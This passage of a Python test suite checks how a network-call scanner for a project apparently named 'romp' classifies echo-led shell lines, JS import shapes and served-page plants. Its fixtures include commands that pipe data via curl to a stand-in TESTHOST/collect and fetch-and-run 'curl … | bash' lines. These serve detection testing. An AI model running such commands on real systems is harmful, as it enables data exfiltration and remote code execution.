             'echo "$(node -e \'fetch("https://TESTHOST/x")\')"\n'
             'echo "tick: `curl -fsSL https://TESTHOST/tick`"\n'
             'echo "$( (cd /tmp) ; curl -fsSL https://TESTHOST/subshell)"\n'
             'echo "$(printf \')\' ; curl -fsSL https://TESTHOST/quoted)"\n'
             'echo "$(printf \\) ; curl -fsSL https://TESTHOST/escaped)"\n'
             'echo "$(curl -fsSL https://TESTHOST/x\n'
             'echo "say \\"hi\\"" | curl -d @- https://TESTHOST/x\n'
             'echo \\"x\\" | curl -d @- https://TESTHOST/x\n'
             'echo \'a #b\' | curl -d @- https://TESTHOST/collect\n'
             'echo a#b | curl -d @- https://TESTHOST/x\n'
             'echo "  curl -fsSL https://TESTHOST/bootstrap.sh | bash"\n'
             'echo "    curl -fsSL <url> | ROMP_DIR=\\"\\$HOME/elsewhere\\" bash" >&2\n'
             'echo "      forward the port:  ssh -N -L $p:127.0.0.1:$p $(hostname -s 2>/dev/null || echo \'<this-host>\')"\n'
             'echo "$body" # | curl -d @- https://TESTHOST/collect\n')
ECHO_STARTS = (("pipe", 'echo "$body" |'), ("substitution", 'echo "rate: $('), ("python", 'echo "$(python3 -c'), ("node", 'echo "$(node -e'),
               ("backtick", 'echo "tick: `'), ("subshell", 'echo "$( (cd'), ("quoted", 'echo "$(printf \')\''), ("escaped", 'echo "$(printf \\)'),
               ("unterminated", 'echo "$(curl'), ("quoted_escape", 'echo "say'), ("bare_escape", 'echo \\"x'), ("single_quote", "echo 'a #b'"),
               ("inner_hash", "echo a#b"),
               ("remedy_pipe", 'echo "  curl'), ("remedy_escaped", 'echo "    curl'), ("remedy_ssh", 'echo "      forward'),
               ("remedy_comment", 'echo "$body" #'))
# the tree's four printed remedies, located by content: the pipe or the substitution stands inside the quotes, so none is live
REMEDY_LINES = (("bin/romp-uninstall", 'bootstrap.sh | bash"'), ("install.sh", 'bootstrap.sh | bash"'),
                ("bootstrap.sh", 'ROMP_DIR=\\"\\$HOME/elsewhere\\"'), ("bin/romp", "forward the port:"))
# the script's echo arm (three lines of line_scan) and the one-line skip it replaced, the mutation's text
ECHO_ARM = ('        if kind == "sh" and s.startswith(("echo ", "print(")):   # a printed remedy is not a request: only what follows the printed text\n'
            '            live = _live_remainder(s[5:] if s.startswith("echo ") else s[6:])   # live (_live_remainder) is scanned, and a line with nothing live is skipped\n'
            '            if not live.strip(): continue\n')
ECHO_SKIP = '        if s.startswith(("echo ", "print(")): continue\n'
# D2, the binding arm: the three shapes the literal list cannot see (an inline require's member, a renamed destructured member, a
# ws default import's constructor), and a namespace-bound call both the literal list and the arm match, counted once
BINDINGS_TEXT = ('import { request as httpRequest } from "http";\nimport WS from "ws";\n\nexport function probeBindings(u: string): void {\n'
                 '  require("http").get("http://TESTHOST/x");\n  httpRequest({ host: "TESTHOST", port: 80, path: "/x" });\n  const s = new WS(u);\n  void s;\n}\n')
DEDUPE_TEXT = 'import * as http from "http";\n\nexport function probeDedupe(): void {\n  http.get("http://TESTHOST/x");\n}\n'
ARM_LINE = "        for tool in _net_sites(live, nb):   # the connection family through the file's bindings: a tool the literal list named on this line is counted once\n"
ARM_OFF = "        for tool in []:\n"
TIMELINE_CALL = "require('http').request("
# D3, the added binding shapes (the fifth round of the review, correctness-3): one call line per shape the patterns gained, over http, ws and
# child_process, the three modules KNOWN_JS_IMPORTS admits (an https, net or tls import in any shape is an IMPORT problem instead),
# each line's tool the family's own; the file is new, so every line is the case's own
SHAPES_TEXT = ('import Hm, { request as mixedRequest } from "http";\nimport Hn, * as Hns from "http";\nimport { default as Hd } from "http";\n'
               'import Hq = require("http");\nimport WSd, { WebSocket as WSn } from "ws";\nimport cp, { spawn as cpSpawn } from "child_process";\n\n'
               'export async function probeBindingShapes(u: string): Promise<void> {\n  const Ha = await import("http");\n'
               '  const { request: awaitedRequest } = await import("http");\n  Hm.get("http://TESTHOST/x");\n'
               '  mixedRequest({ host: "TESTHOST", port: 80, path: "/x" });\n  Hn.get("http://TESTHOST/x");\n'
               '  Hns.request({ host: "TESTHOST", port: 80, path: "/x" });\n  Hd.get("http://TESTHOST/x");\n'
               '  Hq.request({ host: "TESTHOST", port: 80, path: "/x" });\n  Ha.get("http://TESTHOST/x");\n'
               '  awaitedRequest({ host: "TESTHOST", port: 80, path: "/x" });\n  const s = new WSd(u);\n  const t = new WSn(u);\n  void s; void t;\n'
               '  cp.execFile("ls", ["-la"]);\n  cpSpawn("ls", ["-la"]);\n}\n')
# shape -> (its call line in SHAPES_TEXT, the tool the site is keyed on)
SHAPE_LINES = {"mixed default": (11, "http.get"), "mixed named member": (12, "http.request"), "default beside a namespace": (13, "http.get"),
               "namespace beside a default": (14, "http.request"), "import { default as X }": (15, "http.get"), "import-equals": (16, "http.request"),
               "await import() whole": (17, "http.get"), "await import() destructured": (18, "http.request"), "ws mixed default": (19, "WebSocket"),
               "ws mixed named member": (20, "WebSocket"), "child_process mixed default": (22, "execFile"), "child_process mixed named member": (23, "spawn")}
SHAPE_COUNTS = {"http.get": 4, "http.request": 4, "WebSocket": 2, "execFile": 1, "spawn": 1}   # the file's per-key counts, None committed
# the shapes no pattern reads, the fifth round's disclosed residual: a require assigned after its declaration, a .then() callback
# parameter and an aliased require, over http, ws and child_process; the variables are not spelled as the modules, so the literal
# list is silent too. Since the sixth round each is refused at the line that spells it (UNREAD_REFUSED), and no line is a site
UNREAD_TEXT = ('export function probeUnreadBindings(u: string): void {\n  let hh; hh = require("http");\n  hh.get("http://TESTHOST/x");\n'
               '  import("http").then((hp) => hp.get("http://TESTHOST/x"));\n  const rq = require; const hr = rq("http");\n'
               '  hr.get("http://TESTHOST/x");\n  let wl; wl = require("ws"); new wl(u);\n  import("ws").then((wp) => new wp.WebSocket(u));\n'
               '  const wr = rq("ws"); new wr(u);\n  let cpl; cpl = require("child_process"); cpl.execFile("ls", ["-la"]);\n'
               '  import("child_process").then((cpp) => cpp.spawn("ls", ["-la"]));\n  const cpr = rq("child_process"); cpr.execFile("ls", ["-la"]);\n}\n')
# the residual's second half over the packages the list does not know: a late-assigned require and a .then() import of https spell
# a literal require() or import(), which the import gate reads (IMPORT at lines 2 and 4), and since the sixth round the specifier
# refusal names each too; the aliased require spells none, and since the sixth round the bare `require` at line 5 is refused
UNREAD_HTTPS = ('export function probeUnreadHttps(u: string): void {\n  let hs; hs = require("https");\n  hs.get("https://TESTHOST/x");\n'
                '  import("https").then((hp) => hp.get("https://TESTHOST/x"));\n  const rq = require; const hr = rq("https");\n'
                '  hr.get("https://TESTHOST/x");\n}\n')
# The sixth round's refusals (correctness-4, extra6-1, extra7-2): the IMPORT line each gives, the refusal's two messages with the
# place filled in. A family module's specifier the gate reads that no counted binding takes and no arm reads a call through:
_SPEC_REFUSED = ("IMPORT %s:%d names %s in %s, and no binding the patterns count takes the module there and no call the census reads goes "
                 "through it: bind the module whole or by names in a shape the patterns read, or name the place in JS_ALLOW with its reason")
# and, on a walked line, a require or import the gate cannot read (the clause, then the expression as spelled):
_REQ_REFUSED = ("IMPORT %s:%d spells a require or import the import gate cannot read (%s: %s): require a module as require(\"<module>\") or "
                "import(\"<module>\"), the quote right after the paren, or name the place in JS_ALLOW with its reason")
_BARE = "require as a bare value"
# the fifth round's residual plants, each line that spells a refused shape: UNREAD_TEXT's (line, the refusal's message after the place)
UNREAD_REFUSED = ((2, ("names", "http", 'require("http")')), (4, ("names", "http", 'import("http")')), (5, ("spells", _BARE, "require")),
                  (7, ("names", "ws", 'require("ws")')), (8, ("names", "ws", 'import("ws")')),
                  (10, ("names", "child_process", 'require("child_process")')), (11, ("names", "child_process", 'import("child_process")')))
UNREAD_HTTPS_REFUSED = ((2, ("names", "https", 'require("https")')), (4, ("names", "https", 'import("https")')), (5, ("spells", _BARE, "require")))
# The sixth round's first refusal, a family module's specifier no counted binding reads, one line per shape its ruling names (a
# require in a later declarator, `require("http").get` read as a value, a destructured default of `await import()`, a `.then()`
# import) with the named and the namespace re-export, a default beside a brace list that takes `default` (the default is read, the
# brace list's `default as Hy` is not, so the place is not read and Hy.get at line 15 is no site), and the two over-reds the text
# discloses, `import type` and `typeof import()`; each silent at the sixth round's head, each a line under the refusal here
REFUSED_SPECIFIERS_TEXT = ('import type Ht from "http";\nexport { request as probeRequest } from "http";\nexport * as probeCp from "child_process";\n'
                           'import Hx, { default as Hy } from "http";\n\n'
                           'export async function probeRefusedSpecifiers(u: string): Promise<void> {\n'
                           '  const fs = require("fs"), cp = require("child_process");\n  cp.execFile("ls", ["-la"]);\n'
                           '  const get = require("http").get;\n  get("http://TESTHOST/x");\n'
                           '  const { default: h } = await import("http");\n  h.get("http://TESTHOST/x");\n'
                           '  import("http").then((hp) => hp.get("http://TESTHOST/x"));\n  let ta: typeof import("http");\n'
                           '  Hy.get("http://TESTHOST/x");\n  void fs; void Ht; void Hx; void u; void ta;\n}\n')
REFUSED_SPECIFIER_LINES = (("import type, an over-red the text discloses", 1, "http", 'from "http"'),
                           ("a named re-export", 2, "http", 'from "http"'), ("a namespace re-export", 3, "child_process", 'from "child_process"'),
                           ("a default beside a brace list that takes default", 4, "http", 'from "http"'),
                           ("a require in a later declarator", 7, "child_process", 'require("child_process")'),
                           ("require(\"http\").get read as a value", 9, "http", 'require("http")'),
                           ("a destructured default of await import()", 11, "http", 'import("http")'),
                           ("a .then() callback of import()", 13, "http", 'import("http")'),
                           ("typeof import(), an over-red the text discloses", 14, "http", 'import("http")'))
# The sixth round's second refusal, a require or import the gate cannot read, one line per spelling its ruling names (`require (`, a template specifier, a comment
# before the paren, `module.require`, `process.mainModule.require`, createRequire, a member access on require, an aliased require,
# and import( with a gap before its paren or a template specifier); each silent at the sixth round's head, each a line under the
# refusal.
# Line 12 is held at no line: the bare-value clause does not read the word inside a string or a trailing comment (_js_code)
UNREAD_REQUIRES_TEXT = ('export function probeUnreadRequires(u: string): void {\n  const a = require ("http");\n  const b = require(`http`);\n'
                        '  const c = require/* a comment */("http");\n  const d = module.require("http");\n'
                        '  const e = process.mainModule.require("http");\n  const f = createRequire(u)("http");\n'
                        '  const g = require.resolve("http");\n  const r = require;\n  void import (u);\n  void import(`http`);\n'
                        '  const w = "require, in a string"; // a trailing comment that ends with require\n'
                        '  void [a, b, c, d, e, f, g, r, w];\n}\n')
_CALL = "a call of require in a shape the gate does not read"
_IMPORT_GAP = "an import( with a template specifier or a gap before its paren"
UNREAD_REQUIRE_LINES = (("require (", 2, _CALL, 'require ("http")'), ("a template specifier", 3, _CALL, "require(`http`)"),
                        ("a comment before the paren", 4, _CALL, 'require/* a comment */("http")'),
                        ("module.require", 5, "a .require( call", 'module.require("http")'),
                        ("process.mainModule.require", 6, "a .require( call", 'process.mainModule.require("http")'),
                        ("createRequire", 7, "a createRequire( call", "createRequire(u)"),
                        ("a member access on require", 8, "a member access on require", "require.resolve"),
                        ("an aliased require", 9, _BARE, "require"), ("import with a gap before its paren", 10, _IMPORT_GAP, "import (u)"),
                        ("import with a template specifier", 11, _IMPORT_GAP, "import(`http`)"))
# the allowlist's two gates, planted in the same run: the manager's `require.main` guard respelled (its entry then names nothing)
# and a second `new (require('http').Agent)` appended to the timeline view (a second place under that entry's key)
MANAGER_GUARD = "if (require.main === module) {"
MANAGER_GUARD_GONE = "if (process.argv[1] === __filename) {"
TIMELINE_SECOND_AGENT = "const probeAgent = new (require('http').Agent)();\n"
# the four live places JS_ALLOW names at this head: key -> the text that locates its one line in the tree
JS_ALLOW_PLACES = {("bin/romp-manager", "require.main"): "if (require.main === module) {",
                   ("ui/romp-timeline-view.js", "require('http')"): "agent = new (require('http').Agent)(",
                   ("ui/webview/real-viewer-leg.ts", 'createRequire(path.join(EXT, "package.json"))'): "export const requireCjs = createRequire(",
                   ("ui/webview/real-viewer-leg.ts", "import (?!type\\b)"): "RENDER.matchAll(/^import (?!type\\b)"}
MODULE_REASON = ("`module` opens nothing itself, but its createRequire makes a require the import gate cannot read, so a `createRequire(` call "
                 "is refused by name")
# What a binding the patterns read still leaves unread (extra6-3 of the sixth round): a member alias and a destructure from a namespace binding,
# held at their outcome (no site, no line), and a member alias of an https namespace, where the gate reads the specifier (IMPORT at 2);
# since the seventh round's review (its decision on "dotted call") also the calls the texts name as not read, each held at no site and no
# line: whitespace or a comment around the dot or before the paren, on http's namespace (13 to 15), on a bare name bound from http (16)
# and on child_process's namespace (21), and a call split across lines before its paren, after the name (17, 18) or after the dot (19,
# 20), and on child_process's namespace (22, 23)
ALIASES_TEXT = ('import * as http from "http";\nimport * as hs from "https";\nimport { get as hget } from "http";\n'
                'import * as cp from "child_process";\n\nexport function probeUnreadAliases(u: string): void {\n'
                '  const g = http.get;\n  g(u);\n  const { request } = http;\n  request(u);\n  const gs = hs.get;\n  gs(u);\n'
                '  http . get(u);\n  http.get (u);\n  http /* a comment */ .get(u);\n  hget (u);\n  http\n    .request(u);\n  http.\n'
                '    request(u);\n  cp . exec("git status");\n  cp\n    .spawn("git");\n}\n')
# A statement split across lines, gated where the gate reads its specifier (since the sixth round, the texts stating the gate's
# reads): an import led by `from` on the line after its clause (the continuation of a statement that begins its own line), a brace
# list's closing line (read before too), a non-family package's `from` line (the continuation alone reads it: no binding pattern names
# the package) and, since the seventh round's review, a non-family package's `from` string on a continuation line led by a name
# (`  probeSplitN2 } from "probe-split-name";`, the tree's own layout for a long import, read whatever leads the line), each an IMPORT
# line (2, 5, 9, 22); two bindings the patterns read whose specifier the line reader does not read, each no line of the gate: a
# specifier on the line after a trailing `from` (7) and a require split after its paren, whose paren line is the second refusal's (10)
# and whose specifier line is none (11); neither is in the tree, and over the walked files the webview leg's pin
# (ui/webview/import-gate-parse.test.ts) holds the line reader's reads equal to a TypeScript parse, so either in a walked file of the
# tree is red there, by file, line and specifier (UNREAD_BINDINGS); and a binding on a line led by `//`, `/*` or `*`, which the line
# reader skips, refused by name since the seventh round's review (the first refusal: a binding on a line led by //, /* or *, whose
# module the gate does not read), whatever the line is: a comment's line (14), which the pin's parse does not read either, an import's
# `* as hs6` continuation led by `*` (27), a line of code the pin's parse reads, and a `//`-led line inside a template literal (29),
# string text the pin's parse does not read. An `export function` line opens no statement in a walked file (the seventh round's review), so a
# `from` string in a string literal on the next line is no gate line (24). No site, since every client is reached through a member alias
SPLIT_TEXT = ('import * as hs1\n  from "https";\nimport {\n  get as hg2\n} from "https";\nimport * as hs3 from\n  "https";\n'
              'import { probeSplitX }\n  from "probe-split-pkg";\nconst hs4 = require(\n  "https"\n);\n/**\n * const hs5 = require("https");\n */\n'
              'export function probeSplitImports(u: string): void {\n  const g1 = hs1.get; g1(u); const g3 = hs3.get; g3(u); const g4 = hs4.get; g4(u);\n'
              '  void hg2; void probeSplitX;\n}\n'
              'import {\n  probeSplitN1,\n  probeSplitN2 } from "probe-split-name";\n'
              'export function probeSplitNoOpen(): string {\n  return "x" + \' from "probe-split-over"\';\n}\n'
              'import\n  * as hs6 from "https";\nconst probeSplitTpl = `\n// const hs7 = require("https");\n`;\n'
              'export function probeSplitLed(u: string): void {\n  const g6 = hs6.get; g6(u); void probeSplitTpl;\n}\n')
SPLIT_GATED = {2: "https", 5: "https", 9: "probe-split-pkg", 22: "probe-split-name"}
SPLIT_UNGATED = (7, 11)   # a binding's specifier after a trailing `from`, after a require's paren: no gate line (the pin holds the tree)
SPLIT_COMMENT = 14   # a binding on a comment's line: the first refusal's line (neither the gate nor the pin's parse reads a comment)
SPLIT_LED = (27, 29)   # a binding on a line of code led by `*` and one on a `//`-led line of a template literal: the same refusal's lines
SPLIT_NOT_OPENED = 24   # a `from` string in a string literal after an `export function` line, which opens no statement in a walked file
SPLIT_PAREN = 10   # `const hs4 = require(`: the second refusal's line (a call of require the gate cannot read on its own line)
# E, the served pages: the plants in kernel/kernel.py (each located by content in the copy after every plant has landed)
BOOT_ANCHOR = "function post(m){api.postMessage(m);}\n"
BOOT_PLANTS = ('fetch("https://example.invalid/probe");\n'
               'new WebSocket("wss://example.invalid/");\n'
               'window.open("https://example.invalid/");\n'
               "}else{alert('Pull from '+h+' failed');}\n"
               "import x from 'example-pkg';\n"
               "import {\n  y\n} from 'example-split-pkg';\n"
               "export const q = 1;\n"
               "}else{alert('Pulled from '+q+' ok');}\n"
               "import {\n  y2,\n  z2 } from 'example-name-pkg';\n"
               "import w from /* c */ 'example-comment-pkg';\n")
SETTINGS_ANCHOR = '            "<script src=/dist/settings-page.js?v=%d></script></body></html>"'
SETTINGS_PLANT = '            "<script>navigator.sendBeacon(\'https://example.invalid/t\',\'x\')</script>"\n'
CHAT_BRANCH = ('            if p == "/chat":\n                _client_seen[0] = time.time()\n'
               '                return self._send(200, _chat_page(), "text/html; charset=utf-8", cache="no-cache")\n')
ROUTE_PLANTS = ('            if p == "/probe":\n                return self._send(200, _probe_page(), "text/html; charset=utf-8")\n'
                '            if p == "/probe-f":\n                return self._send(200, f"<html>{p}<script>fetch(\'https://example.invalid/f\')</script></html>", "text/html")\n'
                '            if p == "/probe-slot":\n                return self._send(200, "<script>fetch(\'%s\')</script>" % p, "text/html")\n')
PROBE_PAGE_DEF = '\n\ndef _probe_page():\n    return (UI / "probe.html").read_text()\n'
SEND_ANCHOR = "    def _send(self, code, body, ctype, cache=None, headers=None):\n"
SEND_PLANT = "    def _probe_serve(self, body):\n        return self._send(200, body, \"text/html\")\n\n"
SERVED_CALL = "    for rel, tree, routes in served: served_texts(rel, tree, routes, res)\n"
SERVED_OFF = "    pass\n"
# the served text's own sites at the head, located by content in kernel/kernel.py: the shim's and the shell's sockets, the boot's
# dead opener, the worker's opener (each on the local-kernel row), and the four fetches whose route literal a caller passes
SERVED_ROWED = (("WebSocket", 'new WebSocket(proto+location.host+"/ws?app='), ("WebSocket", "new WebSocket(proto+location.host+'/ws?app=shell"),
                ("window.open", 'window.open(url,"_blank")'), ("clients.openWindow", "clients.openWindow(url)"))
SERVED_COMPUTED = ("fetch(u,{cache", "fetch(path,{method:'POST',headers", "fetch(url).then", "fetch(path,{method:'POST',body")
PANE_CSS = re.compile(r'\(UI / "webview" / "([a-z]+-pane\.css)"\)\.read_text\(\)')
# A, the chat-media road: the row's key line and the JS entry (with and without the lookbehind that keeps the definition out)
CHAT_MEDIA_LABEL = "a rendered message's media (browser)"
SVG_TAB_LABEL = "an .svg opened in its own tab (browser)"   # the .svg tab road's row, named and not counted (extra6-2 of the fifth round)
PAINT_ROW_LABEL = "an inline svg's paint references in the chat's file preview and a notice card (browser)"   # the paint road's row (extra6-1)
# The paint clause, one text in every home (the fifth round of the review, D and E; apd's derivation with the round's rulings
# applied): which of an inline svg's paint references load from another host in each engine, and what those requests carry, with the
# token half conditioned on the page's own address carrying `?token=`. Fixed literals here, held equal to the script's table cell by
# TheChatMediaRoadIsRowed and to SECURITY.md's clause by tests/test_security_price_feed.py, which imports these; the browser witness
# ties SECURITY.md's own text to what the attributes do. PAINT_LIST, the first half, is the .svg tab row's list too.
PAINT_LIST = ("in Chromium a `fill`, `stroke`, `clip-path`, `mask`, `marker-start`, `marker-mid` or `marker-end` whose `url()` names another host "
              "loads from that host, in Firefox and WebKit at least a `mask` does, and a `filter` does in no engine")
PAINT_CLAUSE = ("in Chromium a `fill`, `stroke`, `clip-path`, `mask`, `marker-start`, `marker-mid` or `marker-end` whose `url()` names another "
                "host loads from that host, in Firefox and WebKit at least a `mask` does, and a `filter` does in no engine; each such request "
                "carries no cookie and carries the page's origin (the dashboard's scheme, host and port, the port omitted when it is the "
                "scheme's default) in its Origin header; in Chromium a `mask` request can also carry that origin as its Referer, from any page, "
                "framed or bare; and a paint request can carry the full page address with the serve token in its Referer, but only when the "
                "page's own address carries `?token=` (a pane page opened bare, such as `/chat?token=`; the shell drops the token from its "
                "address before it frames its panes, and frames them without it); these paint requests are the one exception to the trust "
                "model's sentence on `Referrer-Policy: same-origin` (the response is blocked as cross-origin; the request, with those headers, "
                "has reached the host)")
# The sent cell's clause on an inline svg's paint references (kept by the sanitizer, loading at render): one text with SECURITY.md's
# sentence and the paint row's, which tests/test_security_price_feed.py holds to the same words; the claim it replaces, that no token
# rides, is held absent, and PAINT_TOKEN_CONDITION is the token half's condition (fresh-2)
CHAT_MEDIA_PAINT = ("an inline svg's paint references load at render too, with no click: in Chromium a `fill`, `stroke`, `clip-path`, `mask`, "
                    "`marker-start`, `marker-mid` or `marker-end` whose `url()` names another host loads from that host, in Firefox and WebKit "
                    "at least a `mask` does, and a `filter` does in no engine; each such request carries no cookie and carries the page's origin "
                    "(the dashboard's scheme, host and port, the port omitted when it is the scheme's default) in its Origin header; in Chromium "
                    "a `mask` request can also carry that origin as its Referer, from any page, framed or bare; and a paint request can carry "
                    "the full page address with the serve token in its Referer, but only when the page's own address carries `?token=` (a pane "
                    "page opened bare, such as `/chat?token=`; the shell drops the token from its address before it frames its panes, and frames "
                    "them without it); these paint requests are the one exception to the trust model's sentence on `Referrer-Policy: "
                    "same-origin` (the response is blocked as cross-origin; the request, with those headers, has reached the host)")
PAINT_TOKEN_CONDITION = "only when the page's own address carries `?token=`"
CHAT_MEDIA_NO_TOKEN_WITHDRAWN = "no serve token, key or login token rides"
# extra6-4: the clicked-link sent cell no longer says the serve token travels only on the bundles' own URLs; it says what romp adds
# to a link's URL and points at the paint reference's Referer with the paint clause's condition, and the old words are held absent,
# with the words of the parenthetical's first rewording (CLICKED_WITHDRAWN)
CLICKED_TRAVELS_ONLY_WITHDRAWN = "the serve token travels only on"
CLICKED_NEW = ("romp adds no serve token, key or login token to a link's URL (a link is built from content or the checkout, never from the "
               "page's address; a paint request's Referer, in the chat-media row and the row for the chat's file preview and a notice card, "
               "can carry the full page address with the serve token, but only when the page's own address carries `?token=`)")
CLICKED_WITHDRAWN = ("no serve token, key or login token rides", "no link carries the serve token", "the one request whose header")
# the chat-media sent cell's cookie clause, one text with SECURITY.md's sentence and the entry's census paragraph, and the cookie words
# it replaces, held absent from the cell and the paragraph
CHAT_MEDIA_COOKIES = "with whatever cookies that browser sends to that host and no Referer to any other origin"
CHAT_MEDIA_COOKIES_WITHDRAWN = ("the cross-site cookies that browser sends", "SameSite", "Lax or Strict")
CHAT_MEDIA_ROW = '_t("chat-media", "ui/webview/render.ts:mdImgPostPass")'
MD_IMG_ENTRY = '("mdImgPostPass", r"(?<!function )\\bmdImgPostPass\\(")'
MD_IMG_ENTRY_NO_LOOKBEHIND = '("mdImgPostPass", r"\\bmdImgPostPass\\(")'
# B, the file viewer's GitHub button: its href write, a dom-load line the listing names by content, never by number
GITHUB_WRITE = 'a.href = url; a.target = "_blank"; a.rel = "noopener";'
GITHUB_LISTING = re.compile(r'^ui/webview/file-view\.ts:(\d+)  dom-load  attribute write  a\.href = url; a\.target = "_blank"; a\.rel = "noopener";  -> \(browser-dom-loads\)$', re.M)
# F, kind_of: the shebang read a dotted hook now reaches, and the early return the mutation restores before it
SHEBANG_LINE = '    with open(path, "rb") as fh: first = fh.readline()   # a dotted name outside those extensions (a .bash hook) is read for its shebang too\n'
EARLY_RETURN = '    if "." in name: return None\n'


def _line_in(lines, needle, where):
    """The 1-based line of the one line among `lines` that carries `needle`; an anchor that is absent or repeated in `where` is
    a broken pin, not a pass."""
    hits = [i + 1 for i, ln in enumerate(lines) if needle in ln]
    if len(hits) != 1:
        raise AssertionError("the anchor %r occurs %d times in %s, not once" % (needle, len(hits), where))
    return hits[0]


def _line_of(path, needle):
    """The 1-based line of the one line of the file at `path` that carries `needle` (_line_in)."""
    return _line_in(_lines(path), needle, path)


class TheEchoRuleScansTheLiveRemainder(_SharedRun):
    """An echo- or print-led shell line is skipped as a printed remedy only when nothing live follows the printed text (the fourth
    round of the review, correctness-1 and regression-2): the text outside the quotes and the body of every $(...) and backtick
    substitution are scanned by the interpreter arm and the tool list, so `echo "$body" | curl ...` and `echo "rate: $(curl ...)"`
    are curl sites on bin/romp's row, as are, since the fifth round (tests-1), four lines that each hold one arm of
    _live_remainder's walk: a backtick substitution inside the quotes (the top loop's backtick branches), a subshell paren before
    the curl inside a body (the paren-depth counter), a quoted paren before it (the body walk's quote state) and a backslash-escaped
    paren before it (the body walk's backslash escape), and since the sixth round (tests-1) five more, one per arm that round found
    unpinned: an unterminated $( body (the body walk's return at the end of the line), a backslash-escaped quote inside the
    outermost double quotes (the top loop's escape there), a backslash before a quote outside any quotes (the top loop's escape
    outside quotes), `echo 'a #b' | curl ...` (the top loop's single-quote state: its test, its close and its advance) and
    `echo a#b | curl ...` (the word-initial condition on #, which a loosened test would break on); the row's committed count moves
    by eleven, and each line is asserted on its own, so a removed arm reds the pin that names it (M47 to M50 and the sixth round's
    mutants, one-line mutants of a scratch copy of the script, in each round's record). A python3 -c substitution is an interpreter
    site on its row (by one) and a node -e one is UNCLASSIFIED, while a remedy that names a tool inside its quotes stays no site:
    three copies of the tree's own remedy lines list nothing, and the four originals, located by content, have no site line while
    the tree runs clean. Beside them since the sixth round, one remedy negative, `echo "$body" # | curl ...`, lists nothing: the #
    starts a comment, and with the word-initial condition deleted the commented curl would be a site. Before the fourth round every
    such line was skipped whole, so the live shapes were silent at exit 0. The block is appended to bin/romp in the shared shell
    run (no other member touches that file); its lines are recorded by content."""

    RUN = "shell"

    @classmethod
    def mutate(cls, cleanup):
        lines = _lines(_append("bin/romp", ECHO_TEXT, cleanup))
        cls.at.update({name: next(i + 1 for i, ln in enumerate(lines) if ln.startswith(start)) for name, start in ECHO_STARTS})

    def test_the_pipe_and_the_substitution_forms_are_sites_and_the_rowed_keys_counts_move(self):
        at, out = self.at, self.out
        self.assertRefused(self.rc, out, "UNCLASSIFIED")
        self.assertListed(out, r"bin/romp:%d  curl  echo \"\$body\" \| curl .*  in -  -> local-kernel$" % at["pipe"], "the pipe form: live text outside the quotes")
        self.assertListed(out, r"bin/romp:%d  curl  echo \"rate: \$\(curl .*  in -  -> local-kernel$" % at["substitution"], "the substitution's body, inside the quotes, is live")
        self.assertListed(out, r"bin/romp:%d  curl  echo \"tick: `curl .*  in -  -> local-kernel$" % at["backtick"],
                          "a backtick substitution inside the quotes is live: the top loop's backtick branches")
        self.assertListed(out, r"bin/romp:%d  curl  echo \"\$\( \(cd /tmp\) ; curl .*  in -  -> local-kernel$" % at["subshell"],
                          "a subshell paren inside the body does not close it: the paren-depth counter")
        self.assertListed(out, r"bin/romp:%d  curl  echo \"\$\(printf '\)' ; curl .*  in -  -> local-kernel$" % at["quoted"],
                          "a quoted paren inside the body does not close it: the body walk's quote state")
        self.assertListed(out, r"bin/romp:%d  curl  echo \"\$\(printf \\\) ; curl .*  in -  -> local-kernel$" % at["escaped"],
                          "a backslash-escaped paren inside the body does not close it: the body walk's backslash escape")
        self.assertListed(out, r"bin/romp:%d  curl  echo \"\$\(curl -fsSL .*  in -  -> local-kernel$" % at["unterminated"],
                          "an unterminated $( body runs to the end of the line and is live: the body walk's return at the end of the line")
        self.assertListed(out, r"bin/romp:%d  curl  echo \"say \\\"hi\\\"\" \| curl .*  in -  -> local-kernel$" % at["quoted_escape"],
                          "a backslash-escaped quote inside the outermost double quotes does not close them: the top loop's escape inside double quotes")
        self.assertListed(out, r"bin/romp:%d  curl  echo \\\"x\\\" \| curl .*  in -  -> local-kernel$" % at["bare_escape"],
                          "a backslash outside the quotes escapes the quote after it, which opens no string: the top loop's escape outside quotes")
        self.assertListed(out, r"bin/romp:%d  curl  echo 'a #b' \| curl .*  in -  -> local-kernel$" % at["single_quote"],
                          "a # inside single quotes is printed text and the quote closes before the pipe: the top loop's single-quote state, "
                          "its test, its close and its advance")
        self.assertListed(out, r"bin/romp:%d  curl  echo a#b \| curl .*  in -  -> local-kernel$" % at["inner_hash"],
                          "a # inside a word starts no comment: the top loop's word-initial condition on #")
        self.assertListed(out, r"bin/romp:%d  python3 -c  .*  in -  -> local-kernel \[external-program\]" % at["python"], "an interpreter substitution is a site on its row, classed")
        self.assertIn("bin/romp:%d" % at["node"], unclassified(out), "the node -e substitution has no row: UNCLASSIFIED")
        self.assertListed(out, r"bin/romp:%d  node -e  .*  in -  -> UNCLASSIFIED \[external-program\]" % at["node"])
        expected = _expected()
        self.assertRefused(self.rc, out, "COUNTS per_key bin/romp:curl: the committed count is %d, this run found %d"
                           % (expected["per_key"]["bin/romp:curl"], expected["per_key"]["bin/romp:curl"] + 11),
                           "COUNTS per_key bin/romp:python3 -c: the committed count is %d, this run found %d"
                           % (expected["per_key"]["bin/romp:python3 -c"], expected["per_key"]["bin/romp:python3 -c"] + 1),
                           "COUNTS per_key bin/romp:node -e: the committed count is None, this run found 1")

    def test_a_remedy_that_names_a_tool_inside_its_quotes_is_no_site(self):
        at, out = self.at, self.out
        named = unclassified(out)
        for name in ("remedy_pipe", "remedy_escaped", "remedy_ssh"):
            self.assertNotIn("bin/romp:%d" % at[name], named, name)
            self.assertFalse(_listed(out, "bin/romp:%d  " % at[name]), "%s: the tool stands in the printed text, inside the quotes, and is not live" % name)
        self.assertNotIn("bin/romp:%d" % at["remedy_comment"], named, "remedy_comment")
        self.assertFalse(_listed(out, "bin/romp:%d  " % at["remedy_comment"]),
                         "remedy_comment: a word-initial # starts a comment, so the pipe after it is not live (the top loop's break on #)")

    def test_the_trees_four_remedy_lines_have_no_site_line_and_the_run_is_clean(self):
        rc, out, _ = tree_run()
        self.assertClean(rc, out)
        for rel, needle in REMEDY_LINES:
            n = _line_of(os.path.join(ROOT, rel), needle)
            self.assertFalse(_listed(out, "%s:%d  " % (rel, n)), "%s:%d prints a remedy whose pipe or substitution stands inside the quotes: no site" % (rel, n))

    def test_the_head_skip_restored_leaves_the_live_lines_silent(self):
        """M19: the one-line skip the round replaced, restored in a scratch copy of the script, skips the thirteen live shapes whole."""
        lines = self.lines(self.append("bin/romp", ECHO_TEXT))
